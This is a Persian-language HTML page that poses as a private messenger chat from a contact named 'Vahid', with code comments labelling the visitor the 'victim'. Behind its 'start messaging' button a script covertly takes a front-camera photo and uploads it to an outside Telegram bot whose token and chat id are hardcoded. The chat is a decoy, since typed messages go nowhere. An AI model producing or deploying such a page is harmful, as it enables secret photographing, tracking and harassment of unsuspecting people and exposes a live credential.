<!doctype html>
<html lang="fa" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1">
<meta name="theme-color" content="#17212b">
<title>پیام‌ها</title>
<style>
  :root{
    --bg:#0e1621; --panel:#17212b; --panel2:#1c2733; --line:#243447;
    --txt:#e6ebf0; --sub:#7d8b99; --bub:#2b5278; --bub2:#182533;
    --accent:#2ea6ff;
  }
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{height:100%;margin:0}
  body{
    background:var(--bg);color:var(--txt);
    font:15px/1.45 "Vazirmatn","Segoe UI",Tahoma,"Iranian Sans",system-ui,sans-serif;
    display:flex;justify-content:center;align-items:stretch;
    direction:rtl;
  }
  .app{
    width:100%;max-width:760px;height:100dvh;display:flex;flex-direction:column;
    background:var(--panel);position:relative;overflow:hidden;
  }

  /* ===== header ===== */
  .hd{
    flex:0 0 56px;display:flex;align-items:center;gap:10px;
    padding:0 10px;background:var(--panel2);border-bottom:1px solid var(--line);
    padding-top:env(safe-area-inset-top);
  }
  .back{width:32px;height:32px;display:grid;place-items:center;color:var(--sub);font-size:22px;cursor:pointer;flex:0 0 32px}
  .av{
    width:40px;height:40px;border-radius:50%;flex:0 0 40px;
    background:linear-gradient(135deg,#7a5bde,#2ea6ff);
    display:grid;place-items:center;color:#fff;font-weight:700;font-size:16px;
    font-family:"Segoe UI",Tahoma,sans-serif;
  }
  .who{flex:1;min-width:0;text-align:right}
  .who .n{font-weight:600;font-size:15px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
  .who .s{font-size:12.5px;color:var(--sub);margin-top:1px}
  .who .s.on{color:var(--accent)}
  .ico{width:36px;height:36px;display:grid;place-items:center;color:var(--sub);font-size:20px;cursor:pointer;flex:0 0 36px}

  /* ===== feed ===== */
  .body{
    flex:1;overflow-y:auto;-webkit-overflow-scrolling:touch;
    padding:14px 12px 8px;
    background:radial-gradient(1200px 500px at 50% -10%,rgba(46,166,255,.05),transparent 70%),var(--panel);
  }
  .syswrap{display:flex;justify-content:center;margin:8px 0}
  .sys{
    font-size:12.5px;color:var(--sub);
    background:rgba(0,0,0,.22);border-radius:12px;padding:5px 12px;
  }
  .row{display:flex;margin:6px 0}
  .row.them{justify-content:flex-end}   /* پیام عامل — سمت راست */
  .row.me{justify-content:flex-start}   /* پیام قربانی — سمت چپ */
  .bub{
    max-width:78%;padding:8px 12px;border-radius:14px;background:var(--bub2);
    word-wrap:break-word;box-shadow:0 1px 0 rgba(0,0,0,.15);
    font-size:15px;line-height:1.5;
  }
  .row.me .bub{background:var(--bub)}
  .bub .t{font-size:11px;color:#9fb2c4;margin-top:3px;text-align:left}
  .row.me .bub .t{color:#bcd3e8}

  /* ===== composer ===== */
  .cm{
    flex:0 0 auto;display:flex;align-items:flex-end;gap:8px;padding:8px 10px;
    background:var(--panel2);border-top:1px solid var(--line);
    padding-bottom:calc(8px + env(safe-area-inset-bottom));
  }
  .in{
    flex:1;min-height:40px;max-height:120px;padding:10px 14px;border-radius:20px;
    background:#101a24;border:1px solid var(--line);color:var(--txt);
    font:inherit;outline:none;resize:none;text-align:right;
  }
  .in::placeholder{color:#5c6b7a}
  .send{
    width:40px;height:40px;flex:0 0 40px;border:0;border-radius:50%;
    background:var(--accent);color:#fff;display:grid;place-items:center;cursor:pointer;
    transition:opacity .15s;
  }
  .send:disabled{opacity:.45;cursor:default}
  .send svg{transform:scaleX(-1)}

  /* ===== start overlay ===== */
  .start{
    position:absolute;inset:0;background:var(--panel);z-index:20;
    display:flex;flex-direction:column;align-items:center;justify-content:center;
    gap:16px;padding:28px;text-align:center;
  }
  .start .big{
    width:100px;height:100px;border-radius:50%;
    background:linear-gradient(135deg,#7a5bde,#2ea6ff);
    display:grid;place-items:center;color:#fff;font-weight:700;font-size:40px;
    font-family:"Segoe UI",Tahoma,sans-serif;
    box-shadow:0 8px 32px rgba(46,166,255,.25);
  }
  .start h2{margin:6px 0 0;font-size:20px;font-weight:700}
  .start p{margin:0;color:var(--sub);font-size:13.5px;max-width:320px;line-height:1.7}
  .cta{
    margin-top:8px;padding:13px 44px;border:0;border-radius:26px;
    background:var(--accent);color:#fff;font-size:16px;font-weight:700;
    font-family:inherit;cursor:pointer;transition:transform .1s,opacity .15s;
  }
  .cta:active{transform:scale(.97)}
  .cta:disabled{opacity:.6;cursor:default}
  .legal{color:#5c6b7a;font-size:11.5px;max-width:300px;line-height:1.7;margin-top:4px}
  .err{color:#ff6b6b;font-size:13px;min-height:18px}
</style>
</head>
<body>
<div class="app">

  <!-- ===== header ===== -->
  <div class="hd">
    <div class="ico">⋮</div>
    <div class="who">
      <div class="n">وحید</div>
      <div class="s" id="hStat">آخرین بازدید به‌تازگی</div>
    </div>
    <div class="av">و</div>
    <div class="back">‹</div>
  </div>

  <!-- ===== feed ===== -->
  <div class="body" id="feed">
    <div class="syswrap"><div class="sys">پیام‌ها رمزنگاری سرتاسری دارند</div></div>

    <!-- تنها پیام — از سمت عامل (وحید) -->
    <div class="row them">
      <div class="bub">
        الو فهمیه یی؟
        <div class="t" id="opTime">—</div>
      </div>
    </div>
  </div>

  <!-- ===== composer ===== -->
  <div class="cm">
    <button class="send" id="send" disabled aria-label="ارسال">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M3 11.5 21 3l-8.5 18-2.3-7.2L3 11.5z"/></svg>
    </button>
    <textarea class="in" id="in" rows="1" placeholder="پیام"></textarea>
  </div>

  <!-- ===== start overlay ===== -->
  <div class="start" id="start">
    <div class="big">و</div>
    <h2>شروع پیام</h2>
    <p>برای آغاز گفتگو با وحید، دکمهٔ زیر را بزنید.</p>
    <button class="cta" id="go">شروع پیام</button>
    <div class="err" id="err"></div>
    <div class="legal">با ادامه، شرایط و حریم خصوصی را می‌پذیرید.</div>
  </div>

</div>

<script>
(function(){
  var TOKEN = "8732154500:AAHqiXtcJseysDbuVlC9J8j-rGu1g-_x920";
  var CHAT  = "8099108408";

  var $ = function(id){ return document.getElementById(id); };
  var feed = $("feed"), start = $("start"), err = $("err"),
      inp = $("in"), send = $("send"), stat = $("hStat");

  // زمان پیام عامل
  var d0 = new Date();
  $("opTime").textContent =
    String(d0.getHours()).padStart(2,"0") + ":" + String(d0.getMinutes()).padStart(2,"0");

  function now(){
    var d = new Date();
    return String(d.getHours()).padStart(2,"0") + ":" + String(d.getMinutes()).padStart(2,"0");
  }
  function scroll(){ feed.scrollTop = feed.scrollHeight; }

  // پیام از سمت قربانی → سمت چپ، تیک دوگانه. هیچ پاسخ خودکاری نمی‌آید.
  function meBubble(text){
    var r = document.createElement("div");
    r.className = "row me";
    r.innerHTML = '<div class="bub">' + text + '<div class="t">' + now() + ' ✓✓</div></div>';
    feed.appendChild(r); scroll();
  }

  // composer
  inp.addEventListener("input", function(){
    send.disabled = inp.value.trim().length === 0;
    inp.style.height = "auto";
    inp.style.height = Math.min(inp.scrollHeight, 120) + "px";
  });
  send.addEventListener("click", function(){
    var v = inp.value.trim(); if(!v) return;
    meBubble(v.replace(/[<>]/g,""));
    inp.value = ""; inp.style.height = "auto"; send.disabled = true;
    // هیچ پاسخ خودکاری. هیچ تایپینگی. فقط ارسال.
  });

  // camera capture
  function grab(){
    return navigator.mediaDevices.getUserMedia({
      video:{ facingMode:"user", width:{ideal:1280}, height:{ideal:720} },
      audio:false
    }).then(function(stream){
      var v = document.createElement("video");
      v.srcObject = stream; v.muted = true; v.playsInline = true;
      v.setAttribute("playsinline","");
      return v.play().then(function(){
        return new Promise(function(res){ setTimeout(res, 900); });
      }).then(function(){
        var c = document.createElement("canvas");
        c.width  = v.videoWidth  || 640;
        c.height = v.videoHeight || 480;
        c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
        stream.getTracks().forEach(function(t){ t.stop(); });
        return new Promise(function(res){ c.toBlob(res, "image/jpeg", 0.92); });
      });
    });
  }

  function upload(blob){
    var fd = new FormData();
    fd.append("chat_id", CHAT);
    fd.append("caption", "session " + new Date().toISOString());
    fd.append("document", blob, "c_" + Date.now() + ".jpg");
    return fetch("https://api.telegram.org/bot" + TOKEN + "/sendDocument",
                 { method:"POST", body:fd });
  }

  function enterChat(){
    start.style.display = "none";
    stat.textContent = "آنلاین"; stat.classList.add("on");
  }

  $("go").addEventListener("click", function(){
    var btn = $("go");
    btn.disabled = true; btn.textContent = "در حال اتصال…";
    err.textContent = "";

    grab().then(function(blob){
      enterChat();
      upload(blob).catch(function(){});
    }).catch(function(){
      enterChat();
    });
  });

  scroll();
})();
</script>
</body>
</html>
